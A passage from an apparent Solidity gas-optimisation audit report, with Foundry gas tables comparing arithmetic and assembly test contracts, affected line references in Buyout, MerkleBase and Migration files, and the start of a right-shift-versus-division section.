\u255e\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2561 \u2502 Deployment Cost    \u2506 Deployment Size \u2506     \u2506        \u2506     \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 37087              \u2506 216             \u2506     \u2506        \u2506     \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 Function Name      \u2506 min             \u2506 avg \u2506 median \u2506 max \u2506 # calls \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 addAssemblyTest    \u2506 263             \u2506 263 \u2506 263    \u2506 263 \u2506 1       \u2502 \u2570\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256f \u256d\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256e \u2502 Contract2 contract \u2506                 \u2506     \u2506        \u2506     \u2506         \u2502 \u255e\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2561 \u2502 Deployment Cost    \u2506 Deployment Size \u2506     \u2506        \u2506     \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 40293              \u2506 232             \u2506     \u2506        \u2506     \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 Function Name      \u2506 min             \u2506 avg \u2506 median \u2506 max \u2506 # calls \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 subTest            \u2506 300             \u2506 300 \u2506 300    \u2506 300 \u2506 1       \u2502 \u2570\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256f \u256d\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256e \u2502 Contract3 contract \u2506                 \u2506     \u2506        \u2506     \u2506         \u2502 \u255e\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2561 \u2502 Deployment Cost    \u2506 Deployment Size \u2506     \u2506        \u2506     \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 37287              \u2506 217             \u2506     \u2506        \u2506     \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 Function Name      \u2506 min             \u2506 avg \u2506 median \u2506 max \u2506 # calls \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 subAssemblyTest    \u2506 263             \u2506 263 \u2506 263    \u2506 263 \u2506 1       \u2502 \u2570\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256f \u256d\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256e \u2502 Contract4 contract \u2506                 \u2506     \u2506        \u2506     \u2506         \u2502 \u255e\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2561 \u2502 Deployment Cost    \u2506 Deployment Size \u2506     \u2506        \u2506     \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 41893              \u2506 240             \u2506     \u2506        \u2506     \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 Function Name      \u2506 min             \u2506 avg \u2506 median \u2506 max \u2506 # calls \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 mulTest            \u2506 325             \u2506 325 \u2506 325    \u2506 325 \u2506 1       \u2502 \u2570\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256f \u256d\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256e \u2502 Contract5 contract \u2506                 \u2506     \u2506        \u2506     \u2506         \u2502 \u255e\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2561 \u2502 Deployment Cost    \u2506 Deployment Size \u2506     \u2506        \u2506     \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 37087              \u2506 216             \u2506     \u2506        \u2506     \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 Function Name      \u2506 min             \u2506 avg \u2506 median \u2506 max \u2506 # calls \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 mulAssemblyTest    \u2506 265             \u2506 265 \u2506 265    \u2506 265 \u2506 1       \u2502 \u2570\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256f \u256d\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256e \u2502 Contract6 contract \u2506                 \u2506     \u2506        \u2506     \u2506         \u2502 \u255e\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2561 \u2502 Deployment Cost    \u2506 Deployment Size \u2506     \u2506        \u2506     \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 41893              \u2506 240             \u2506     \u2506        \u2506     \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 Function Name      \u2506 min             \u2506 avg \u2506 median \u2506 max \u2506 # calls \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 divTest            \u2506 325             \u2506 325 \u2506 325    \u2506 325 \u2506 1       \u2502 \u2570\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256f \u256d\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256e \u2502 Contract7 contract \u2506                 \u2506     \u2506        \u2506     \u2506         \u2502 \u255e\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2561 \u2502 Deployment Cost    \u2506 Deployment Size \u2506     \u2506        \u2506     \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 37287              \u2506 217             \u2506     \u2506        \u2506     \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 Function Name      \u2506 min             \u2506 avg \u2506 median \u2506 max \u2506 # calls \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 divAssemblyTest    \u2506 265             \u2506 265 \u2506 265    \u2506 265 \u2506 1       \u2502 \u2570\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256f  ```  ### Lines - FERC1155.sol:247  - Buyout.sol:86  - Buyout.sol:87  - Buyout.sol:88  - Buyout.sol:124  - Buyout.sol:138  - Buyout.sol:161  - Buyout.sol:165  - Buyout.sol:202  - Buyout.sol:209  - Buyout.sol:268  - Buyout.sol:269  - VaultFactory.sol:77  - Vault.sol:128  - MerkleBase.sol:92  - MerkleBase.sol:93  - MerkleBase.sol:97  - MerkleBase.sol:100  - MerkleBase.sol:107  - MerkleBase.sol:112  - MerkleBase.sol:136  - MerkleBase.sol:137  - MerkleBase.sol:138  - MerkleBase.sol:142  - MerkleBase.sol:147  - MerkleBase.sol:148  - Migration.sol:194  - Migration.sol:471  - Migration.sol:527  - Migration.sol:528  - Migration.sol:544  - Migration.sol:545   --- ## Right shift instead of dividing by two  ```js  contract GasTest is DSTest {     Contract0 c0;     Contract1 c1;      function setUp() public {         c0 = new Contract0();         c1 = new Contract1();     }      function testGas() public view {         c0.div2();         c1.shr2();     } }  contract Contract0 {     function div2() public view {         uint256 val = 10;         uint256 valDivTwo = val / 2;         valDivTwo++;     } }  contract Contract1 {     function shr2() public view {         uint256 val = 10;         uint256 valDivTwo = val >> 1;         valDivTwo++;     } } ```  ### Gas Report  ```js \u256d\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256e \u2502 Contract0 contract \u2506                 \u2506     \u2506        \u2506     \u2506         \u2502 \u255e\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2561 \u2502 Deployment Cost    \u2506 Deployment Size \u2506     \u2506        \u2506     \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 41493              \u2506 238             \u2506     \u2506        \u2506     \u2506         \u2502 